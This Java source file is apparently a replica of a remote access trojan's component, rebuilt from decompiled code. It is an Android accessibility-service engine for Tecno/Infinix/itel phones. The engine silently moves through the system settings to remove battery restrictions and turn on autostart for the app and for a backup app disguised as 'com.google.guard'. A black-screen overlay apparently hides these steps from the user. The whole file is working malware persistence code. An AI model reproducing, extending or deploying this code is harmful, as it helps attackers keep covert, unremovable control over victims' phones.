package com.vendor.rat.auto.engine.vendor;

import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import com.vendor.rat.MainApplication;
import com.vendor.rat.auto.condition.CombineFilter;
import com.vendor.rat.auto.engine.AutoEngine;
import com.vendor.rat.auto.entity.CheckedResult;
import com.vendor.rat.auto.entity.UiNode;
import com.vendor.rat.service.MyAccessibilityService;

import java.util.ArrayList;
import java.util.List;
import java.util.Objects;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicReference;

/**
 * 传音 (Tecno/Infinix/itel) 厂商保活引擎
 *
 * 基于逆向: o/e0.java (373行) — 所有厂商引擎中最简单
 *
 * 3-state 状态机:
 *   1. App详情 → 2. 耗电管理 → 3. 自启动管理
 *
 * 覆盖 2 个目标包名:
 *   com.android.settings / com.transsion.phonemaster
 */
public class TranssionEngine extends AutoEngine {

    private static final String TAG = "TranssionEngine";

    // ====== 包名 — 对齐 vendor o/e0.java ======
    private static final String SETTINGS = "com.android.settings";
    private static final String PHONE_MASTER = "com.transsion.phonemaster";

    // ====== Activity — 对齐 vendor ======
    private static final String AUTO_START_ACTIVITY =
        "com.cyin.himgr.autostart.AutoStartActivity";
    private static final String INSTALLED_APP_DETAILS =
        "com.android.settings.applications.InstalledAppDetailsTop";
    private static final String APP_INFO_SETTINGS =
        "com.transsion.settings.applications.appinfo.AppInfoSettings";
    private static final String SUB_SETTINGS =
        "com.android.settings.SubSettings";

    // ====== 保活类型 — 对应逆向 r.e ======
    private static final String KA_UNKNOWN = "KEEP_ALIVE_UNKNOWN";
    private static final String KA_MAIN = "KEEP_ALIVE_MAIN_APP";
    private static final String KA_BACKUP = "KEEP_ALIVE_BACKUP_APP";
    private static final String BACKUP_APP = "com.google.guard";

    // ====== State 常量 — 对应逆向 stateQueue ======
    private static final String ST_APP_DETAIL = "keepAliveInAppDetail";
    private static final String ST_APP_BATTERY = "keepAliveInAppBattery";
    private static final String ST_AUTO_START = "keepAliveInAutoStart";

    // ====== 字段 — 对应 vendor f627r~f633x (7个) ======
    private final AtomicReference<String> keepAliveType =
        new AtomicReference<>(KA_UNKNOWN);                                // f627r
    private final AtomicBoolean mainAutoStart = new AtomicBoolean(false);      // f628s
    private final AtomicBoolean backupAutoStart = new AtomicBoolean(false);    // f629t
    private final AtomicBoolean mainRelateStart = new AtomicBoolean(true);     // f630u
    private final AtomicBoolean backupRelateStart = new AtomicBoolean(true);   // f631v
    private final AtomicBoolean mainBackground = new AtomicBoolean(false);     // f632w
    private final AtomicBoolean backupBackground = new AtomicBoolean(false);   // f633x

    private String appName;

    // ====== 窗口检测分组 ======
    private final List<WindowMatcher> appDetailWins = new ArrayList<>();
    private final List<WindowMatcher> batteryWins = new ArrayList<>();
    private final List<WindowMatcher> autoStartWins = new ArrayList<>();

    // ====== 构造函数 — 对应 vendor 行 49-63 ======
    public TranssionEngine() {
        super(buildWindowMatchers(), SETTINGS);
        buildDetectionGroups();
        try {
            scheduler.schedule(new Runnable() {
                @Override
                public void run() { finish(); }
            }, 60L, TimeUnit.SECONDS);
        } catch (Exception e) {
            Log.e(TAG, "Schedule failed", e);
        }
    }

    private void buildDetectionGroups() {
        // k0() — App详情: InstalledAppDetailsTop / AppInfoSettings / FrameLayout
        appDetailWins.add(new WindowMatcher(SETTINGS, INSTALLED_APP_DETAILS)
            .addEventType(32).addEventType(16384));
        appDetailWins.add(new WindowMatcher(SETTINGS, APP_INFO_SETTINGS)
            .addEventType(32).addEventType(16384));
        appDetailWins.add(new WindowMatcher(SETTINGS, "android.widget.FrameLayout")
            .addEventType(32).addEventType(16384));

        // j0() — 耗电管理: SubSettings
        batteryWins.add(new WindowMatcher(SETTINGS, SUB_SETTINGS)
            .addEventType(32).addEventType(16384));

        // l0() — 自启动管理: AutoStartActivity / FrameLayout
        autoStartWins.add(new WindowMatcher(PHONE_MASTER, AUTO_START_ACTIVITY)
            .addEventType(32).addEventType(16384));
        autoStartWins.add(new WindowMatcher(PHONE_MASTER, "android.widget.FrameLayout")
            .addEventType(32).addEventType(16384));
    }

    // ====== buildWindowMatchers — 对应 vendor n0() 行 146-156, 7个 ======
    private static List<WindowMatcher> buildWindowMatchers() {
        List<WindowMatcher> list = new ArrayList<>();
        // 0: c.J() — 电池优化对话框
        list.add(new WindowMatcher(SETTINGS, "android.app.Dialog")
            .addEventType(32).addEventType(16384));
        // 1: i0() — 自启动管理
        list.add(new WindowMatcher(PHONE_MASTER, AUTO_START_ACTIVITY)
            .addEventType(32).addEventType(16384));
        // 2: h0() — 手机管家 FrameLayout
        list.add(new WindowMatcher(PHONE_MASTER, "android.widget.FrameLayout")
            .addEventType(32).addEventType(16384));
        // 3: d0(null) — 应用详情
        list.add(new WindowMatcher(SETTINGS, INSTALLED_APP_DETAILS)
            .addEventType(32).addEventType(16384));
        // 4: e0(null) — 传音应用信息
        list.add(new WindowMatcher(SETTINGS, APP_INFO_SETTINGS)
            .addEventType(32).addEventType(16384));
        // 5: m0(null) — 设置 FrameLayout
        list.add(new WindowMatcher(SETTINGS, "android.widget.FrameLayout")
            .addEventType(32).addEventType(16384));
        // 6: c0() — SubSettings
        list.add(new WindowMatcher(SETTINGS, SUB_SETTINGS)
            .addEventType(32).addEventType(16384));
        return list;
    }

    // ====== 窗口检测 — 对应 vendor j0/k0/l0 ======

    /** vendor k0() 行 239-255: App详情窗口 */
    private boolean k0() { return matchesAny(appDetailWins); }

    /** vendor j0() 行 226-237: 耗电管理窗口 (SubSettings) */
    private boolean j0() { return matchesAny(batteryWins); }

    /** vendor l0() 行 257-271: 自启动管理窗口 */
    private boolean l0() { return matchesAny(autoStartWins); }

    // ====== 抽象方法实现 ======

    @Override
    public void onWindowMatched(String packageName, String className,
                                AccessibilityEvent event) {
        // vendor 不使用回调模式，通过 onAccessibilityEvent 的状态机处理
    }

    @Override
    public void execute() {
        // vendor: 外部启动应用详情页
        startSilent(SETTINGS, INSTALLED_APP_DETAILS);
    }

    // ====== 事件处理 — 对应 vendor u() 行 332-372 ======

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event, String packageName,
                                     String className) {
        try {
            if (T()) return;
            currentPackage = packageName;
            currentClassName = className;

            // vendor u():338-340 — super.u() 电池优化对话框
            if (event != null) {
                checkBatteryOptimizationDialog();
            }

            // [1] k0() → App详情
            // vendor u():341-350 — 注意: 3 个 if 是顺序执行,非 if-else
            if (k0()) {
                stateQueue.remove(ST_APP_BATTERY);
                stateQueue.remove(ST_AUTO_START);
                if (!stateQueue.contains(ST_APP_DETAIL)) {
                    stateQueue.add(ST_APP_DETAIL);
                    scheduler.execute(new Runnable() {
                        @Override public void run() { handleAppDetail(); }
                    });
                }
            }
            // [2] j0() → 耗电管理
            // vendor u():352-358
            if (j0()) {
                stateQueue.remove(ST_APP_DETAIL);
                stateQueue.remove(ST_AUTO_START);
                if (!stateQueue.contains(ST_APP_BATTERY)) {
                    stateQueue.add(ST_APP_BATTERY);
                    scheduler.execute(new Runnable() {
                        @Override public void run() { handleAppBattery(); }
                    });
                }
            }
            // [3] l0() → 自启动管理
            // vendor u():360-368
            if (l0()) {
                stateQueue.remove(ST_APP_DETAIL);
                stateQueue.remove(ST_APP_BATTERY);
                if (!stateQueue.contains(ST_AUTO_START)) {
                    stateQueue.add(ST_AUTO_START);
                    scheduler.execute(new Runnable() {
                        @Override public void run() { handleAutoStart(); }
                    });
                }
            }
        } catch (Exception e) {
            logError("事件处理异常", e);
        }
    }

    // ====== 任务处理 — 对应 vendor d0(case) ======

    /**
     * case 0: App详情页 — 查找电池/电源/耗电入口→点击
     * vendor: d0(this, 0) — 使用 b0()/f0()/g0() 3 个 filter 依次查找
     */
    private void handleAppDetail() {
        try {
            if (!k0()) return;
            updateProgress(10);
            activateRoot();
            UiNode root = k();
            if (root == null) return;

            // vendor b0(): COMMON_SETTINGS_BATTERY_TEXT — "电池"
            UiNode target = root.findOneByCombine(buildBatteryFilter());
            // vendor f0(): COMMON_SETTINGS_POWER_TEXT — "电源"
            if (target == null) {
                target = root.findOneByCombine(buildPowerFilter());
            }
            // vendor g0(): COMMON_SETTINGS_USE_POWER_TEXT — "耗电"
            if (target == null) {
                target = root.findOneByCombine(buildUsePowerFilter());
            }

            if (target != null) {
                Log.d(TAG, "电池/电源/耗电栏目查找成功");
                UiNode clickable = target.findClickableParent();
                if (clickable != null && clickable.click()) {
                    Log.d(TAG, "已点击电池栏目");
                    updateProgress(30);
                }
            } else {
                Log.e(TAG, "电池/电源/耗电栏目查找失败");
            }
        } catch (Exception e) {
            logError("handleAppDetail", e);
        }
    }

    /**
     * case 1: 耗电管理页 — 查找"不受限"并选中
     * vendor: d0(this, 1) — 调用 o0(root)
     *
     * o0() 反编译失败 (254 条指令), 从上下文重建:
     * - 使用 q0() 构建 OR filter (不受限/无限制/已取消限制)
     * - 在 scrollView 中查找匹配项
     * - 找到后获取 clickable parent → 使用 R() 坐标点击操作
     * - 如果是 RadioButton/CheckBox, 确保选中状态
     * - 返回操作后的 UiObject
     */
    private void handleAppBattery() {
        try {
            if (!j0()) return;
            updateProgress(40);
            activateRoot();
            UiNode root = k();
            if (root == null) return;

            // o0(root) 重建: 查找不受限选项
            UiNode target = performBatteryOptimization(root);
            if (target != null) {
                boolean isMain = KA_MAIN.equals(keepAliveType.get());
                if (isMain) {
                    mainBackground.set(true);
                } else {
                    backupBackground.set(true);
                }
                Log.d(TAG, "电池优化操作完成");
                updateProgress(60);
            } else {
                Log.e(TAG, "不受限选项查找失败");
            }
        } catch (Exception e) {
            logError("handleAppBattery", e);
        }
    }

    /**
     * 重建 vendor o0(UiObject) — 反编译失败 (254 条指令)
     *
     * 推断逻辑 (基于 q0 filter + 类似引擎的电池优化操作):
     * 1. 在 scrollView 中查找 q0() 匹配的"不受限"/"无限制"/"已取消限制"
     * 2. 直接查找 root
     * 3. 找到后获取 clickable parent
     * 4. 使用 R(parent, retries) 坐标点击 (vendor 常用模式)
     * 5. 返回操作后的节点
     *
     * @param root 根节点
     * @return 操作后的节点, 失败返回 null
     */
    private UiNode performBatteryOptimization(UiNode root) {
        try {
            // 先在 scrollView 中查找
            UiNode scrollView = getScrollableNode();
            UiNode target = null;

            CombineFilter unrestrictedFilter = buildUnrestrictedFilter();

            if (scrollView != null) {
                target = scrollView.scrollForwardUntil(unrestrictedFilter);
                if (target == null) {
                    target = scrollView.scrollBackwardUntil(unrestrictedFilter);
                }
            }
            // fallback: 直接在 root 查找
            if (target == null) {
                target = root.findOneByCombine(unrestrictedFilter);
            }

            if (target != null) {
                Log.d(TAG, "不受限选项查找成功: " + target);
                UiNode clickable = target.findClickableParent();
                if (clickable != null) {
                    // vendor 模式: 使用 R(parent, retries) 坐标点击确保选中
                    CheckedResult result = R(clickable, 3);
                    if (result.isClicked() || result.isChecked()) {
                        Log.d(TAG, "已选中不受限选项");
                        return target;
                    }
                }
                // fallback: 直接点击
                if (target.click()) {
                    Log.d(TAG, "已点击不受限选项");
                    return target;
                }
            }
        } catch (Exception e) {
            logError("performBatteryOptimization", e);
        }
        return null;
    }

    /**
     * case 2: 自启动管理页 — 操作自启动开关
     * vendor: d0(this, 2) — 使用 H(appName) 查找 + O() 操作 Switch
     */
    private void handleAutoStart() {
        try {
            if (!l0()) return;
            updateProgress(70);
            activateRoot();
            UiNode scrollView = getScrollableNode();
            UiNode target = null;

            CombineFilter appFilter = buildAppNameFilter();

            if (scrollView != null) {
                target = scrollView.scrollForwardUntil(appFilter);
            }
            if (target == null && k() != null) {
                target = k().findOneByCombine(appFilter);
            }

            if (target != null) {
                Log.d(TAG, "自启动应用查找成功");
                UiNode clickable = target.findClickableParent();
                if (clickable == null) {
                    clickable = target.findParentUtilCombine(
                        com.vendor.rat.auto.condition.CombineFilter.clickable());
                }
                if (clickable != null) {
                    CheckedResult result = O(clickable);
                    if (result.isClicked() || result.isChecked()) {
                        boolean isMain = KA_MAIN.equals(keepAliveType.get());
                        if (isMain) {
                            mainAutoStart.set(true);
                        } else {
                            backupAutoStart.set(true);
                        }
                        Log.d(TAG, "自启动开关操作完成");
                        updateProgress(90);
                    }
                }
            } else {
                Log.e(TAG, "自启动应用查找失败");
            }
        } catch (Exception e) {
            logError("handleAutoStart", e);
        }
    }

    // ====== 状态持久化 — 对应 vendor p0() 行 291-330 ======

    private void saveState() {
        try {
            Log.d(TAG, "主进程保活策略已保存"
                + " auto=" + mainAutoStart.get()
                + " relate=" + mainRelateStart.get()
                + " bg=" + mainBackground.get());
            Log.d(TAG, "备用进程保活策略已保存"
                + " auto=" + backupAutoStart.get()
                + " relate=" + backupRelateStart.get()
                + " bg=" + backupBackground.get());
        } catch (Exception e) {
            logError("saveState", e);
        }
    }

    // ====== finish — 对应 vendor Z() 行 195-224 ======

    @Override
    public void finish() {
        if (lock.tryLock()) {
            try {
                if (!T()) {
                    Log.d(TAG, "准备结束本地保活自动化引擎");
                    updateProgress(100);
                    X();
                    if (MyAccessibilityService.getInstance() != null) {
                        MyAccessibilityService.getInstance().H(true, true);
                    }
                    saveState();
                    scheduler.shutdownNow();
                    stateQueue.clear();
                    // vendor Z():211-214 — 传音无 PIP 判断, 直接移除遮罩
                    T0(5);
                    removeBlackScreen();
                    Log.d(TAG, "已结束本地保活自动化引擎");
                    // vendor Z():216 — c.W() 通知策略
                    if (MainApplication.getInstance() != null) {
                        MainApplication.getInstance()
                            .offerStrategyEvent("PREPARE_FOR_APP_CONFIRM_LOCK");
                    }
                }
            } catch (Exception e) {
                logError("finish", e);
            } finally {
                lock.unlock();
            }
        }
        super.finish();
    }

    // ====== CombineFilter — 对应 vendor b0/f0/g0/q0 ======

    /** vendor b0() 行 65-74: COMMON_SETTINGS_BATTERY_TEXT */
    private static CombineFilter buildBatteryFilter() {
        return CombineFilter.textView("电池");
    }

    /** vendor f0() 行 102-111: COMMON_SETTINGS_POWER_TEXT */
    private static CombineFilter buildPowerFilter() {
        return CombineFilter.textView("电源");
    }

    /** vendor g0() 行 113-122: COMMON_SETTINGS_USE_POWER_TEXT */
    private static CombineFilter buildUsePowerFilter() {
        return CombineFilter.textView("耗电");
    }

    /**
     * vendor q0() 行 158-193: OR(不受限/无限制/已取消限制)
     * vendor 使用 CombineFiltersWithOr，replica 用 CombineFilter.or()
     */
    private static CombineFilter buildUnrestrictedFilter() {
        return CombineFilter.or(
            CombineFilter.textView("不受限"),
            CombineFilter.textView("无限制"),
            CombineFilter.textView("已取消限制")
        );
    }

    /** 应用名称 filter — 对应 vendor c.H(appName) */
    private CombineFilter buildAppNameFilter() {
        return CombineFilter.textView(getAppName());
    }

    // ====== 工具方法 ======

    private String getAppName() {
        return appName != null ? appName : "com.vendor.rat";
    }

    public void setAppName(String appName) {
        this.appName = appName;
    }

    // ====== equals/hashCode — 对齐 vendor 模式 ======

    @Override
    public boolean equals(Object obj) {
        return obj instanceof TranssionEngine;
    }

    @Override
    public int hashCode() {
        return Objects.hash(TranssionEngine.class.getName());
    }
}
